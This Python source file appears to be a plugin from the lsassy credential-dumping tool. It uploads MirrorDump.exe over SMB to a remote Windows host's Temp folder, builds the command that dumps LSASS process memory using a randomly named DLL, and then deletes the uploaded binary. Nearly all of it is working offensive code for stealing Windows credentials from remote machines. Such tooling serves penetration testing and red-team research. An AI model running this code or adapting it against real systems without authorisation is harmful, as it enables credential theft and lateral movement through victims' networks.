import logging
import os
import time
import base64
import random
import string

from lsassy.impacketfile import ImpacketFile

from lsassy.dumpmethod import IDumpMethod


class DumpMethod(IDumpMethod):
    def __init__(self, session, timeout):
        super().__init__(session, timeout)
        self.mirrordump = "MirrorDump.exe"
        self.mirrordump_path = False
        self.mirrordump_remote_share = "C$"
        self.mirrordump_remote_path = "\\Windows\\Temp\\"

        self.mirrordump_uploaded = False

    def prepare(self, options):
        self.mirrordump = options.get("mirrordump", self.mirrordump)
        self.mirrordump_path = options.get("mirrordump_path", self.mirrordump_path)
        self.mirrordump_remote_share = options.get("mirrordump_remote_share", self.mirrordump_remote_share)
        self.mirrordump_remote_path = options.get("mirrordump_remote_path", self.mirrordump_remote_path)

        if not self.mirrordump_path:
            logging.error("Missing mirrordump_path")
            return None

        if not os.path.exists(self.mirrordump_path):
            logging.error("{} does not exist.".format(self.mirrordump_path))
            return None

        # Upload MirrorDump
        logging.debug('Copy {} to {}'.format(self.mirrordump_path, self.mirrordump_remote_path))
        with open(self.mirrordump_path, 'rb') as p:
            try:
                self._session.smb_session.putFile(self.mirrordump_remote_share, self.mirrordump_remote_path + self.mirrordump, p.read)
                logging.success("MirrorDump successfully uploaded")
                self.mirrordump_uploaded = True
                return True
            except Exception as e:
                logging.error("MirrorDump upload error", exc_info=True)
                return None

    def clean(self):
        if self.mirrordump_uploaded:
            ImpacketFile.delete(self._session, self.mirrordump_remote_path + self.mirrordump, timeout=self._timeout)

    def get_commands(self, dump_path=None, dump_name=None, no_powershell=False):
        cmd_command = """{}{} -f {}{} -d {}""".format(
            self.mirrordump_remote_path, self.mirrordump,
            self.dump_path, self.dump_name,
            ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8)) + ".dll"
        )
        pwsh_command = cmd_command
        return {
            "cmd": cmd_command,
            "pwsh": pwsh_command
        }
